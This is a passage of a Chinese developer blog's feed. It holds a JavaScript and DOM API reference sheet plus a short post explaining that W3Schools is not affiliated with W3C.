        <content type="html"><![CDATA[<h5 id="API集锦，需要用时查阅用。"><a href="#API集锦，需要用时查阅用。" class="headerlink" title="API集锦，需要用时查阅用。"></a>API集锦，需要用时查阅用。</h5><p>一、节点<br>1.1 节点属性</p><p>Node.nodeName &#x2F;&#x2F;返回节点名称，只读<br>Node.nodeType &#x2F;&#x2F;返回节点类型的常数值，只读<br>Node.nodeValue &#x2F;&#x2F;返回Text或Comment节点的文本值，只读<br>Node.textContent &#x2F;&#x2F;返回当前节点和它的所有后代节点的文本内容，可读写<br>Node.baseURI &#x2F;&#x2F;返回当前网页的绝对路径</p><p>Node.ownerDocument &#x2F;&#x2F;返回当前节点所在的顶层文档对象，即document<br>Node.nextSibling &#x2F;&#x2F;返回紧跟在当前节点后面的第一个兄弟节点<br>Node.previousSibling &#x2F;&#x2F;返回当前节点前面的、距离最近的一个兄弟节点<br>Node.parentNode &#x2F;&#x2F;返回当前节点的父节点<br>Node.parentElement &#x2F;&#x2F;返回当前节点的父Element节点<br>Node.childNodes &#x2F;&#x2F;返回当前节点的所有子节点<br>Node.firstChild &#x2F;&#x2F;返回当前节点的第一个子节点<br>Node.lastChild &#x2F;&#x2F;返回当前节点的最后一个子节点</p><p>&#x2F;&#x2F;parentNode接口<br>Node.children &#x2F;&#x2F;返回指定节点的所有Element子节点<br>Node.firstElementChild &#x2F;&#x2F;返回当前节点的第一个Element子节点<br>Node.lastElementChild &#x2F;&#x2F;返回当前节点的最后一个Element子节点<br>Node.childElementCount &#x2F;&#x2F;返回当前节点所有Element子节点的数目。</p><p>1.2 操作</p><p>Node.appendChild(node) &#x2F;&#x2F;向节点添加最后一个子节点<br>Node.hasChildNodes() &#x2F;&#x2F;返回布尔值，表示当前节点是否有子节点<br>Node.cloneNode(true); &#x2F;&#x2F; 默认为false(克隆节点), true(克隆节点及其属性，以及后代)<br>Node.insertBefore(newNode,oldNode) &#x2F;&#x2F; 在指定子节点之前插入新的子节点<br>Node.removeChild(node) &#x2F;&#x2F;删除节点，在要删除节点的父节点上操作<br>Node.replaceChild(newChild,oldChild) &#x2F;&#x2F;替换节点<br>Node.contains(node) &#x2F;&#x2F;返回一个布尔值，表示参数节点是否为当前节点的后代节点。<br>Node.compareDocumentPosition(node) &#x2F;&#x2F;返回一个7个比特位的二进制值，表示参数节点和当前节点的关系<br>Node.isEqualNode(noe) &#x2F;&#x2F;返回布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。<br>Node.normalize() &#x2F;&#x2F;用于清理当前节点内部的所有Text节点。它会去除空的文本节点，并且将毗邻的文本节点合并成一个。</p><p>&#x2F;&#x2F;ChildNode接口<br>Node.remove() &#x2F;&#x2F;用于删除当前节点<br>Node.before() &#x2F;&#x2F;<br>Node.after()<br>Node.replaceWith()<br>1.3 Document节点</p><p>1.3.1 Document节点的属性</p><p>document.doctype &#x2F;&#x2F;<br>document.documentElement &#x2F;&#x2F;返回当前文档的根节点<br>document.defaultView &#x2F;&#x2F;返回document对象所在的window对象<br>document.body &#x2F;&#x2F;返回当前文档的<body>节点<br>document.head &#x2F;&#x2F;返回当前文档的<head>节点<br>document.activeElement &#x2F;&#x2F;返回当前文档中获得焦点的那个元素。</p><p>&#x2F;&#x2F;节点集合属性<br>document.links &#x2F;&#x2F;返回当前文档的所有a元素<br>document.forms &#x2F;&#x2F;返回页面中所有表单元素<br>document.images &#x2F;&#x2F;返回页面中所有图片元素<br>document.embeds &#x2F;&#x2F;返回网页中所有嵌入对象<br>document.scripts &#x2F;&#x2F;返回当前文档的所有脚本<br>document.styleSheets &#x2F;&#x2F;返回当前网页的所有样式表</p><p>&#x2F;&#x2F;文档信息属性<br>document.documentURI &#x2F;&#x2F;表示当前文档的网址<br>document.URL &#x2F;&#x2F;返回当前文档的网址<br>document.domain &#x2F;&#x2F;返回当前文档的域名<br>document.lastModified &#x2F;&#x2F;返回当前文档最后修改的时间戳<br>document.location &#x2F;&#x2F;返回location对象，提供当前文档的URL信息<br>document.referrer &#x2F;&#x2F;返回当前文档的访问来源<br>document.title &#x2F;&#x2F;返回当前文档的标题<br>document.characterSet属性返回渲染当前文档的字符集，比如UTF-8、ISO-8859-1。<br>document.readyState &#x2F;&#x2F;返回当前文档的状态<br>document.designMode &#x2F;&#x2F;控制当前文档是否可编辑，可读写<br>document.compatMode &#x2F;&#x2F;返回浏览器处理文档的模式<br>document.cookie &#x2F;&#x2F;用来操作Cookie</p><p>1.3.2 Document节点的方法</p><p>（1）读写方法</p><p>document.open() &#x2F;&#x2F;用于新建并打开一个文档<br>document.close() &#x2F;&#x2F;不安比open方法所新建的文档<br>document.write() &#x2F;&#x2F;用于向当前文档写入内容<br>document.writeIn() &#x2F;&#x2F;用于向当前文档写入内容，尾部添加换行符。<br>（2）查找节点</p><p>document.querySelector(selectors) &#x2F;&#x2F;接受一个CSS选择器作为参数，返回第一个匹配该选择器的元素节点。<br>document.querySelectorAll(selectors) &#x2F;&#x2F;接受一个CSS选择器作为参数，返回所有匹配该选择器的元素节点。<br>document.getElementsByTagName(tagName) &#x2F;&#x2F;返回所有指定HTML标签的元素<br>document.getElementsByClassName(className) &#x2F;&#x2F;返回包括了所有class名字符合指定条件的元素<br>document.getElementsByName(name) &#x2F;&#x2F;用于选择拥有name属性的HTML元素（比如<form>、<radio>、<img>、<frame>、<embed>和<object>等）<br>document.getElementById(id) &#x2F;&#x2F;返回匹配指定id属性的元素节点。<br>document.elementFromPoint(x,y) &#x2F;&#x2F;返回位于页面指定位置最上层的Element子节点。<br>（3）生成节点</p><p>document.createElement(tagName) &#x2F;&#x2F;用来生成HTML元素节点。<br>document.createTextNode(text) &#x2F;&#x2F;用来生成文本节点<br>document.createAttribute(name) &#x2F;&#x2F;生成一个新的属性对象节点，并返回它。<br>document.createDocumentFragment() &#x2F;&#x2F;生成一个DocumentFragment对象<br>（4）事件方法</p><p>document.createEvent(type) &#x2F;&#x2F;生成一个事件对象，该对象能被element.dispatchEvent()方法使用<br>document.addEventListener(type,listener,capture) &#x2F;&#x2F;注册事件<br>document.removeEventListener(type,listener,capture) &#x2F;&#x2F;注销事件<br>document.dispatchEvent(event) &#x2F;&#x2F;触发事件<br>（5）其他</p><p>document.hasFocus() &#x2F;&#x2F;返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。<br>document.adoptNode(externalNode) &#x2F;&#x2F;将某个节点，从其原来所在的文档移除，插入当前文档，并返回插入后的新节点。<br>document.importNode(externalNode, deep) &#x2F;&#x2F;从外部文档拷贝指定节点，插入当前文档。<br>1.4 Element节点</p><p>1.4.1 Element节点的属性</p><p>（1）特性属性</p><p>Element.attributes &#x2F;&#x2F;返回当前元素节点的所有属性节点<br>Element.id &#x2F;&#x2F;返回指定元素的id属性，可读写<br>Element.tagName &#x2F;&#x2F;返回指定元素的大写标签名<br>Element.innerHTML &#x2F;&#x2F;返回该元素包含的HTML代码，可读写<br>Element.outerHTML &#x2F;&#x2F;返回指定元素节点的所有HTML代码，包括它自身和包含的的所有子元素，可读写<br>Element.className &#x2F;&#x2F;返回当前元素的class属性，可读写<br>Element.classList &#x2F;&#x2F;返回当前元素节点的所有class集合<br>Element.dataset &#x2F;&#x2F;返回元素节点中所有的data-*属性。<br>（2）尺寸属性</p><p>Element.clientHeight &#x2F;&#x2F;返回元素节点可见部分的高度<br>Element.clientWidth &#x2F;&#x2F;返回元素节点可见部分的宽度<br>Element.clientLeft &#x2F;&#x2F;返回元素节点左边框的宽度<br>Element.clientTop &#x2F;&#x2F;返回元素节点顶部边框的宽度<br>Element.scrollHeight &#x2F;&#x2F;返回元素节点的总高度<br>Element.scrollWidth &#x2F;&#x2F;返回元素节点的总宽度<br>Element.scrollLeft &#x2F;&#x2F;返回元素节点的水平滚动条向右滚动的像素数值,通过设置这个属性可以改变元素的滚动位置<br>Element.scrollTop &#x2F;&#x2F;返回元素节点的垂直滚动向下滚动的像素数值<br>Element.offsetHeight &#x2F;&#x2F;返回元素的垂直高度(包含border,padding)<br>Element.offsetWidth &#x2F;&#x2F;返回元素的水平宽度(包含border,padding)<br>Element.offsetLeft &#x2F;&#x2F;返回当前元素左上角相对于Element.offsetParent节点的垂直偏移<br>Element.offsetTop &#x2F;&#x2F;返回水平位移<br>Element.style &#x2F;&#x2F;返回元素节点的行内样式<br>（3）节点相关属性</p><p>Element.children &#x2F;&#x2F;包括当前元素节点的所有子元素<br>Element.childElementCount &#x2F;&#x2F;返回当前元素节点包含的子HTML元素节点的个数<br>Element.firstElementChild &#x2F;&#x2F;返回当前节点的第一个Element子节点<br>Element.lastElementChild &#x2F;&#x2F;返回当前节点的最后一个Element子节点<br>Element.nextElementSibling &#x2F;&#x2F;返回当前元素节点的下一个兄弟HTML元素节点<br>Element.previousElementSibling &#x2F;&#x2F;返回当前元素节点的前一个兄弟HTML节点<br>Element.offsetParent &#x2F;&#x2F;返回当前元素节点的最靠近的、并且CSS的position属性不等于static的父元素。</p><p>1.4.2 Element节点的方法</p><p>（1）位置方法</p><p>getBoundingClientRect()<br>&#x2F;&#x2F; getBoundingClientRect返回一个对象，包含top,left,right,bottom,width,height &#x2F;&#x2F; width、height 元素自身宽高<br>&#x2F;&#x2F; top 元素上外边界距窗口最上面的距离<br>&#x2F;&#x2F; right 元素右外边界距窗口最上面的距离<br>&#x2F;&#x2F; bottom 元素下外边界距窗口最上面的距离<br>&#x2F;&#x2F; left 元素左外边界距窗口最上面的距离<br>&#x2F;&#x2F; width 元素自身宽(包含border,padding)<br>&#x2F;&#x2F; height 元素自身高(包含border,padding)</p><p>getClientRects() &#x2F;&#x2F;返回当前元素在页面上形参的所有矩形。</p><p>&#x2F;&#x2F; 元素在页面上的偏移量<br>var rect &#x3D; el.getBoundingClientRect()<br>return {<br>top: rect.top + document.body.scrollTop,<br>left: rect.left + document.body.scrollLeft<br>}<br>（2）属性方法</p><p>Element.getAttribute()：读取指定属性<br>Element.setAttribute()：设置指定属性<br>Element.hasAttribute()：返回一个布尔值，表示当前元素节点是否有指定的属性<br>Element.removeAttribute()：移除指定属性<br>（3）查找方法</p><p>Element.querySelector()<br>Element.querySelectorAll()<br>Element.getElementsByTagName()<br>Element.getElementsByClassName()<br>（4）事件方法</p><p>Element.addEventListener()：添加事件的回调函数<br>Element.removeEventListener()：移除事件监听函数<br>Element.dispatchEvent()：触发事件</p><p>&#x2F;&#x2F;ie8<br>Element.attachEvent(oneventName,listener)<br>Element.detachEvent(oneventName,listener)</p><p>&#x2F;&#x2F; event对象<br>var event &#x3D; window.event||event;</p><p>&#x2F;&#x2F; 事件的目标节点<br>var target &#x3D; event.target || event.srcElement;</p><p>&#x2F;&#x2F; 事件代理<br>ul.addEventListener(‘click’, function(event) {<br>if (event.target.tagName.toLowerCase() &#x3D;&#x3D;&#x3D; ‘li’) {<br>console.log(event.target.innerHTML)<br>}<br>});<br>（5）其他</p><p>Element.scrollIntoView() &#x2F;&#x2F;滚动当前元素，进入浏览器的可见区域</p><p>&#x2F;&#x2F;解析HTML字符串，然后将生成的节点插入DOM树的指定位置。<br>Element.insertAdjacentHTML(where, htmlString);<br>Element.insertAdjacentHTML(‘beforeBegin’, htmlString); &#x2F;&#x2F; 在该元素前插入<br>Element.insertAdjacentHTML(‘afterBegin’, htmlString); &#x2F;&#x2F; 在该元素第一个子元素前插入<br>Element.insertAdjacentHTML(‘beforeEnd’, htmlString); &#x2F;&#x2F; 在该元素最后一个子元素后面插入<br>Element.insertAdjacentHTML(‘afterEnd’, htmlString); &#x2F;&#x2F; 在该元素后插入</p><p>Element.remove() &#x2F;&#x2F;用于将当前元素节点从DOM中移除<br>Element.focus() &#x2F;&#x2F;用于将当前页面的焦点，转移到指定元素上</p><p>二、CSS操作<br>（1）类名操作</p><p>&#x2F;&#x2F;ie8以下<br>Element.className &#x2F;&#x2F;获取元素节点的类名<br>Element.className +&#x3D; ‘ ‘ + newClassName &#x2F;&#x2F;新增一个类名</p><p>&#x2F;&#x2F;判断是否有某个类名<br>function hasClass(element,className){<br>return new RegExp(className,’gi’).test(element.className);<br>}</p><p>&#x2F;&#x2F;移除class<br>function removeClass(element,className){<br>element.className &#x3D; element.className.replace(new RegExp(‘(^|\b)’ + className.split(‘ ‘).join(‘|’) + ‘(\b|$)’, ‘gi’),’’);<br>}</p><p>&#x2F;&#x2F;ie10<br>element.classList.add(className) &#x2F;&#x2F;新增<br>element.classList.remove(className) &#x2F;&#x2F;删除<br>element.classList.contains(className) &#x2F;&#x2F;是否包含<br>element.classList.toggle(className) &#x2F;&#x2F;toggle class</p><p>（2）style操作</p><p>element.setAttribute(‘style’,’’)</p><p>element.style.backgroundColor &#x3D; ‘red’</p><p>element.style.cssText &#x2F;&#x2F;用来读写或删除整个style属性</p><p>element.style.setProperty(propertyName,value) &#x2F;&#x2F;设置css属性<br>element.style.getPropertyValue(property) &#x2F;&#x2F;获取css属性<br>element.style.removeProperty(property) &#x2F;&#x2F;删除css属性<br>操作非内联样式<br>&#x2F;&#x2F;ie8<br>element.currentStyle[attrName]<br>&#x2F;&#x2F;ie9+<br>window.getComputedStyle(el,null)[attrName]<br>window.getComputedStyle(el,null).getPropertyValue(attrName)<br>&#x2F;&#x2F;伪类<br>window.getComputedStyle(el,’:after’)[attrName]</p><p>三、对象<br>3.1 Object对象</p><p>（1）生成实例对象</p><p>var o &#x3D; new Object()<br>（2）属性</p><p>Object.prototype &#x2F;&#x2F;返回原型对象<br>（3）方法</p><p>Object.keys(o) &#x2F;&#x2F;遍历对象的可枚举属性<br>Object.getOwnPropertyName(o) &#x2F;&#x2F;遍历对象不可枚举的属性<br>对象实例的方法</p><p>valueOf()：返回当前对象对应的值。<br>toString()：返回当前对象对应的字符串形式。<br>toLocaleString()：返回当前对象对应的本地字符串形式。<br>hasOwnProperty()：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。<br>isPrototypeOf()：判断当前对象是否为另一个对象的原型。<br>propertyIsEnumerable()：判断某个属性是否可枚举。</p><p>3.2 Array对象</p><p>（1）生成实例对象</p><p>var a &#x3D; new Array()<br>（2）属性</p><p>a.length &#x2F;&#x2F;长度<br>（3）Array.isArray()</p><p>Array.isArray(a) &#x2F;&#x2F;用来判断一个值是否为数组<br>（4）Array实例的方法</p><p>a.valueof() &#x2F;&#x2F;返回数组本身<br>a.toString() &#x2F;&#x2F;返回数组的字符串形式<br>a.push(value,vlaue….) &#x2F;&#x2F;用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。<br>pop() &#x2F;&#x2F;用于删除数组的最后一个元素，并返回该元素<br>join() &#x2F;&#x2F;以参数作为分隔符，将所有数组成员组成一个字符串返回。如果不提供参数，默认用逗号分隔。<br>concat() &#x2F;&#x2F;用于多个数组的合并。它将新数组的成员，添加到原数组的尾部，然后返回一个新数组，原数组不变。<br>shift() &#x2F;&#x2F;用于删除数组的第一个元素，并返回该元素。<br>unshift(value) &#x2F;&#x2F;用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。<br>reverse() &#x2F;&#x2F;用于颠倒数组中元素的顺序，返回改变后的数组<br>slice(start_index, upto_index); &#x2F;&#x2F;用于提取原数组的一部分，返回一个新数组，原数组不变。第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。负数表示倒数第几个。<br>splice(index, count_to_remove, addElement1, addElement2, …); &#x2F;&#x2F;用于删除原数组的一部分成员，并可以在被删除的位置添加入新的数组成员，返回值是被删除的元素。第一个参数是删除的起始位置，第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。<br>sort() &#x2F;&#x2F;对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数，表示按照自定义方法进行排序。该函数本身又接受两个参数，表示进行比较的两个元素。如果返回值大于0，表示第一个元素排在第二个元素后面；其他情况下，都是第一个元素排在第二个元素前面。<br>map() &#x2F;&#x2F;对数组的所有成员依次调用一个函数，根据函数结果返回一个新数组。<br>map(elem,index,arr) &#x2F;&#x2F;map方法接受一个函数作为参数。该函数调用时，map方法会将其传入三个参数，分别是当前成员、当前位置和数组本身。<br>forEach() &#x2F;&#x2F;遍历数组的所有成员，执行某种操作,参数是一个函数。它接受三个参数，分别是当前位置的值、当前位置的编号和整个数组。<br>filter() &#x2F;&#x2F;参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。<br>some() &#x2F;&#x2F;用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。只要有一个数组成员的返回值是true，则整个some方法的返回值就是true，否则false。<br>every() &#x2F;&#x2F;用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。所有数组成员的返回值都是true，才返回true，否则false。<br>reduce() &#x2F;&#x2F;依次处理数组的每个成员，最终累计为一个值。从左到右处理（从第一个成员到最后一个成员）<br>reduceRight() &#x2F;&#x2F;依次处理数组的每个成员，最终累计为一个值。从右到左（从最后一个成员到第一个成员）<br>indexOf(s) &#x2F;&#x2F;返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置<br>lastIndexOf() &#x2F;&#x2F;返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1。</p><p>3.3 Number对象</p><p>（1）生成对象</p><p>var n &#x3D; new Number()<br>（2）Number对象的属性</p><p>Number.POSITIVE_INFINITY：正的无限，指向Infinity。<br>Number.NEGATIVE_INFINITY：负的无限，指向-Infinity。<br>Number.NaN：表示非数值，指向NaN。<br>Number.MAX_VALUE：表示最大的正数，相应的，最小的负数为-Number.MAX_VALUE。<br>Number.MIN_VALUE：表示最小的正数（即最接近0的正数，在64位浮点数体系中为5e-324），相应的，最接近0的负数为-Number.MIN_VALUE。<br>Number.MAX_SAFE_INTEGER：表示能够精确表示的最大整数，即9007199254740991。<br>Number.MIN_SAFE_INTEGER：表示能够精确表示的最小整数，即-9007199254740991。<br>（4）Number对象实例的方法</p><p>toString() &#x2F;&#x2F;用来将一个数值转为字符串形式.可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。<br>toFixed() &#x2F;&#x2F;用于将一个数转为指定位数的小数，返回这个小数对应的字符串。<br>toExponential() &#x2F;&#x2F;用于将一个数转为科学计数法形式。可传入一个参数，参数表示小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个RangeError。<br>toPrecision() &#x2F;&#x2F;用于将一个数转为指定位数的有效数字。<br>3.4 String 对象</p><p>（1）生成实例对象</p><p>var s &#x3D; new String()<br>（2）String对象的属性</p><p>s.length &#x2F;&#x2F;返回字符串的长度<br>（3）方法</p><p>s.chatAt(index) &#x2F;&#x2F;返回指定位置的字符<br>s.fromCharCode() &#x2F;&#x2F;该方法的参数是一系列Unicode码点，返回对应的字符串。<br>s.charCodeAt(index) &#x2F;&#x2F;返回给定位置字符的Unicode码点（十进制表示）<br>s.concat(s2) &#x2F;&#x2F;用于连接两个字符串<br>s.slice(start,end) &#x2F;&#x2F;用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。<br>s.substring(start,end) &#x2F;&#x2F;用于从原字符串取出子字符串并返回，不改变原字符串.第一个参数表示子字符串的开始位置，第二个位置表示结束位置。<br>s.substr(start,length) &#x2F;&#x2F;用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的长度。如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。<br>s.indexOf(s) &#x2F;&#x2F;返回给定元素在字符串中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置<br>s.lastIndexOf() &#x2F;&#x2F;返回给定元素在字符串中最后一次出现的位置，如果没有出现则返回-1。<br>s.trim() &#x2F;&#x2F;用于去除字符串两端的空格，返回一个新字符串<br>s.toLowerCase() &#x2F;&#x2F;用于将一个字符串全部转为小写,返回一个新字符串，不改变原字符串。<br>s.toUpperCase() &#x2F;&#x2F;全部转为大写<br>s.localeCompare(s2) &#x2F;&#x2F;用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。<br>s.match(regexp) &#x2F;&#x2F;用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回null。<br>s.search() &#x2F;&#x2F;返回值为匹配的第一个位置。如果没有找到匹配，则返回-1。<br>s.replace(oldValue,newValue) &#x2F;&#x2F;用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式）。<br>s.split() &#x2F;&#x2F;按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。还可传入第二个参数，决定了返回数组的成员数。</p><p>3.5 Math对象</p><p>（1）属性</p><p>Math.E：常数e。<br>Math.LN2：2的自然对数。<br>Math.LN10：10的自然对数。<br>Math.LOG2E：以2为底的e的对数。<br>Math.LOG10E：以10为底的e的对数。<br>Math.PI：常数Pi。<br>Math.SQRT1_2：0.5的平方根。<br>Math.SQRT2：2的平方根。<br>（2）数学方法</p><p>Math.abs()：返回参数的绝对值<br>Math.ceil()：向上取整，接受一个参数，返回大于该参数的最小整数。<br>Math.floor()：向下取整<br>Math.max(n,n1,…)：可接受多个参数，返回最大值<br>Math.min(n,n1,..)：可接受多个参数，返回最小值<br>Math.pow(n,e)：指数运算, 返回以第一个参数为底数、第二个参数为幂的指数值。<br>Math.sqrt()：返回参数值的平方根。如果参数是一个负值，则返回NaN。<br>Math.log()：返回以e为底的自然对数值。<br>Math.exp()：返回e的指数，也就是常数e的参数次方。<br>Math.round()：四舍五入<br>Math.random()：返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。<br>（3）三角函数方法</p><p>Math.sin()：返回参数的正弦<br>Math.cos()：返回参数的余弦<br>Math.tan()：返回参数的正切<br>Math.asin()：返回参数的反正弦（弧度值）<br>Math.acos()：返回参数的反余弦（弧度值）<br>Math.atan()：返回参数的反正切（弧度值）</p><p>3.6 JSON对象</p><p>（1）方法</p><p>JSON.stringify()<br>&#x2F;&#x2F;用于将一个值转为字符串。该字符串应该符合JSON格式，并且可以被JSON.parse方法还原。<br>&#x2F;&#x2F;（JSON.stringify(obj, selectedProperties)）还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。<br>&#x2F;&#x2F;还可以接受第三个参数，用于增加返回的JSON字符串的可读性。如果是数字，表示每个属性前面添加的空格（最多不超过10个）；如果是字符串（不超过10个字符），则该字符串会添加在每行前面。</p><p>JSON.parse() &#x2F;&#x2F;用于将JSON字符串转化成对象。<br>3.7 console对象</p><p>（1）方法</p><p>console.log(text,text2,…) &#x2F;&#x2F;用于在console窗口输出信息。它可以接受多个参数，将它们的结果连接起来输出。如果第一个参数是格式字符串（使用了格式占位符），console.log方法将依次用后面的参数替换占位符，然后再进行输出。<br>console.info() &#x2F;&#x2F;在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。<br>console.debug() &#x2F;&#x2F;在console窗口输出信息，同时，会在输出信息的前面，加上一个蓝色图标。<br>console.warn() &#x2F;&#x2F;输出信息时，在最前面加一个黄色三角，表示警告；<br>console.error() &#x2F;&#x2F;输出信息时，在最前面加一个红色的叉，表示出错，同时会显示错误发生的堆栈<br>console.table() &#x2F;&#x2F;可以将复合类型的数据转为表格显示。<br>console.count() &#x2F;&#x2F;用于计数，输出它被调用了多少次。<br>console.dir() &#x2F;&#x2F;用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示。<br>console.dirxml() &#x2F;&#x2F;用于以目录树的形式，显示DOM节点。<br>console.assert() &#x2F;&#x2F;接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为false，才会输出第二个参数，否则不会有任何结果。</p><p>&#x2F;&#x2F;这两个方法用于计时，可以算出一个操作所花费的准确时间。<br>console.time()<br>console.timeEnd()<br>&#x2F;&#x2F;time方法表示计时开始，timeEnd方法表示计时结束。它们的参数是计时器的名称。调用timeEnd方法之后，console窗口会显示“计时器名称: 所耗费的时间”。</p><p>console.profile() &#x2F;&#x2F;用来新建一个性能测试器（profile），它的参数是性能测试器的名字。<br>console.profileEnd() &#x2F;&#x2F;用来结束正在运行的性能测试器。</p><p>console.group()<br>console.groupend()<br>&#x2F;&#x2F;上面这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠&#x2F;展开。<br>console.groupCollapsed() &#x2F;&#x2F;用于将显示的信息分组，该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。</p><p>console.trace() &#x2F;&#x2F;显示当前执行的代码在堆栈中的调用路径。<br>console.clear() &#x2F;&#x2F;用于清除当前控制台的所有输出，将光标回置到第一行。</p>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于原生js的一些研究</title>
      <link href="/Blog/2018/08/23/day_thinking/%E5%85%B3%E4%BA%8E%E5%8E%9F%E7%94%9Fjs%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/index/"/>
      <url>/Blog/2018/08/23/day_thinking/%E5%85%B3%E4%BA%8E%E5%8E%9F%E7%94%9Fjs%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A0%94%E7%A9%B6/index/</url>
      
        <content type="html"><![CDATA[<h1 id="关于原生js的一些研究"><a href="#关于原生js的一些研究" class="headerlink" title="关于原生js的一些研究"></a><a href="https://segmentfault.com/a/1190000002911253">关于原生js的一些研究</a></h1>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于W3Schools趣闻</title>
      <link href="/Blog/2018/08/23/zch&#39;s_fool/%E5%85%B3%E4%BA%8EW3Schools%E8%B6%A3%E9%97%BB/index/"/>
      <url>/Blog/2018/08/23/zch&#39;s_fool/%E5%85%B3%E4%BA%8EW3Schools%E8%B6%A3%E9%97%BB/index/</url>
      
        <content type="html"><![CDATA[<p>早期在刚接触前端时，听到最多的学习手册、参考网站就是<a href="http://www.w3school.com.cn/">W3Schools</a>，当时以为这就是W3C出的官网教程，每次遇到模糊的知识点总是优先翻阅这里，但是知道今天(其实文章早点一年前就发布了…)偶然看到<a href="https://zhuanlan.zhihu.com/p/22332152">一篇文章</a>：</p><h3 id="强烈不推荐W3Schools！！！"><a href="#强烈不推荐W3Schools！！！" class="headerlink" title="强烈不推荐W3Schools！！！"></a>强烈不推荐W3Schools！！！</h3><h4 id="W3Schools-跟-W3C-组织没有关系！！！"><a href="#W3Schools-跟-W3C-组织没有关系！！！" class="headerlink" title="W3Schools 跟 W3C 组织没有关系！！！"></a>W3Schools 跟 W3C 组织没有关系！！！</h4><p>W3Schools 是由挪威的 Refsnes Data 创建的，我们可以将其定位一个「教程网站」，它提供了参考手册、代码样例和 Try it yourself 沙盒。</p><p>由于早期 W3C 和 MDN 的文档对新人极其不友好，所以 W3Schools 很快成本前端开发入门的首选教程。</p><p><img src="/Blog/img.png" alt="......"></p><h6 id="吓得我赶紧狠狠点击了这里-权威的Mozilla-Developer-Network-和-这里-Web-Platform-Docs-，从今天开始纠正，免得把错误-http-www-w3fools-com-的知识当成正确。"><a href="#吓得我赶紧狠狠点击了这里-权威的Mozilla-Developer-Network-和-这里-Web-Platform-Docs-，从今天开始纠正，免得把错误-http-www-w3fools-com-的知识当成正确。" class="headerlink" title="吓得我赶紧狠狠点击了这里(权威的Mozilla Developer Network) 和 这里(Web Platform Docs)，从今天开始纠正，免得把错误(http://www.w3fools.com/)的知识当成正确。"></a>吓得我赶紧狠狠点击了<a href="https://developer.mozilla.org/zh-CN/docs/Web">这里(权威的Mozilla Developer Network)</a> 和 <a href="https://link.zhihu.com/?target=http://www.webplatform.org/">这里(Web Platform Docs)</a>，从今天开始纠正，免得把<a href="http://www.w3fools.com/">错误(http://www.w3fools.com/)</a>的知识当成正确。</h6><blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://link.zhihu.com/?target=http://www.infragistics.com/community/blogs/devtoolsguy/archive/2016/01/29/what-is-the-story-behind-www-w3fools-com.aspx">What is the story behind www.w3fools.com?</a><br>P.S. 至于 <a href="https://link.zhihu.com/?target=http://www.w3school.com.cn/">w3school 在线教程</a> 中文版的 w3school （没有 s ），还不如 W3schools 。唯一的优点就是「翻译成了中文」。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 趣闻 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS关于let趣闻</title>
      <link href="/Blog/2018/08/22/zch&#39;s_fool/JS%E5%85%B3%E4%BA%8Elet%E8%B6%A3%E9%97%BB/index/"/>
      <url>/Blog/2018/08/22/zch&#39;s_fool/JS%E5%85%B3%E4%BA%8Elet%E8%B6%A3%E9%97%BB/index/</url>
      
